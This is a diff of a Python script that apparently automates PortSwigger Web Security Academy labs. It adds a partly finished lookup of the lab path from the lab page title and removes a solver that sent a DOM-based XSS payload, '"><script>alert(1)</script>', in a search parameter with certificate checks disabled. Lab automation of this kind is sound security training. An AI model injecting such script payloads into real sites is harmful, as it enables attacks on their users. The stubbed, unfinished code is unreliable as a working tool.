@@ -1,9 +1,12 @@
 from bs4 import BeautifulSoup
 from urllib.parse import urlencode, urljoin
 
+import importlib
 import argparse
 import requests
 import urllib3
+import string
+import re
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -15,16 +18,16 @@ def get_args():
     return parser.parse_args()
 
 
-def print_info(string):
-    print(f"\033[1;94m[*]\033[00m {string}")
+def print_info(string, end="\n"):
+    print(f"\r\033[1;94m[*]\033[00m {string}", end=end)
 
 
-def print_success(string):
-    print(f"\033[1;92m[+]\033[00m {string}")
+def print_success(string, end="\n"):
+    print(f"\r\033[1;92m[+]\033[00m {string}", end=end)
 
 
 def print_fail(string):
-    print(f"\033[1;91m[-]\033[00m {string}")
+    print(f"\r\033[1;91m[-]\033[00m {string}")
     exit(1)
 
 
@@ -35,6 +38,24 @@ def verify_lab_accessible(url):
         print_success("URL is accessible.\n")
     else:
         print_fail("URL is inaccessible. Reopen the lab and use new URL.")
+
+    soup = BeautifulSoup(resp.text, "html.parser")
+    title = soup.title.text
+    print_info(title)
+
+    # Map lab title to path by visiting 'https://portswigger.net/web-security/all-labs'
+    resp = requests.get("https://portswigger.net/web-security/all-labs")
+    soup = BeautifulSoup(resp.text, "html.parser")
+
+    matchfunc = lambda tag: tag.text == title
+    res = soup.find(matchfunc)
+    path = res.attrs["href"]
+    # module = path[1:].replace('/', '.')
+    # importlib.import_module('.cross_site_scripting', 'web_security')
+    print_success(path)
+    exit()
+
+    # TODO: import_module + getattr
 
 
 def verify_lab_solved(url):
@@ -48,14 +69,7 @@ def verify_lab_solved(url):
 
 
 def solve_lab(url, proxies):
-    params = {"search": "\"><script>alert(1)</script>"}
-    print_info(
-        f'Performing DOM-based XSS attack by visiting "{url}" with the following parameters:'
-    )
-    print(params)
-
-    requests.get(url, params=params, proxies=proxies, verify=False)
-    print_success("DOM-based XSS attack performed.\n")
+    pass
 
 
 def main():
